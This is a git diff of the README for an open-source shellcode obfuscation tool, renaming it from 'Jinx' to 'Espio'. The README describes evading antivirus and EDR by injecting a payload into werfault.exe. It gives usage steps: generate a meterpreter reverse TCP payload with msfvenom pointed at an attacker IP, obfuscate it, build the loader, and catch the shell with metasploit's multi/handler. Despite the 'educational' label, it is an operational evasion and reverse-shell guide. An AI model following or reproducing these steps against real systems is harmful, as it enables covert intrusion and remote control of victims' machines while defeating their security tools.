@@ -1,4 +1,4 @@
-# Jinx (For Educational Purposes Only)
+# Espio (For Educational Purposes Only)
 ## Shellcode obfuscation tool to avoid AV/EDR.
 [![Python 3.10.4](https://img.shields.io/badge/Python-3.10.4-yellow.svg)](https://www.python.org/) [![C++ 14](https://img.shields.io/badge/C%2B%2B-14-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/) [![License: MIT](https://img.shields.io/badge/License-MIT-brightgreen.svg)](https://opensource.org/licenses/MIT)
 
@@ -9,7 +9,7 @@
 - Process Injection - injecting the payload to werfault.exe.
 
 ## Requirements
-Jinx requires [Python3](https://www.python.org/) and [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/) to use.
+Espio requires [Python3](https://www.python.org/) and [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/) to use.
 
 ## Usage
 1. Clone the repository:
@@ -26,11 +26,11 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -
 ```bash
 python3 obfuscator.py shellcode
 ```
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note: Our shellcode then be obfuscated to **obfuscatedPayload.bin** with the **key.bin** key and saved in loader/Jinx.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note: Our shellcode then be obfuscated to **obfuscatedPayload.bin** with the **key.bin** key and saved in loader/Espio.
 
-4. Open loader/Jinx.sln, the Visual Studio solution file.
+4. Open loader/Espio.sln, the Visual Studio solution file.
 
-5. Build The project (Recommended: change the build configuration from Debug to Release).<br>Note: The executable file will be located at loader/x64/Release/Jinx.exe or loader/x64/Debug/Jinx.exe, depends on the build configuration.
+5. Build The project (Recommended: change the build configuration from Debug to Release).<br>Note: The executable file will be located at loader/x64/Release/Espio.exe or loader/x64/Debug/Espio.exe, depends on the build configuration.
 
 6. On the attacker's machine, listen for TCP connections on the defined port. In our case, run metasploit's multi/handler on port 1337.
 
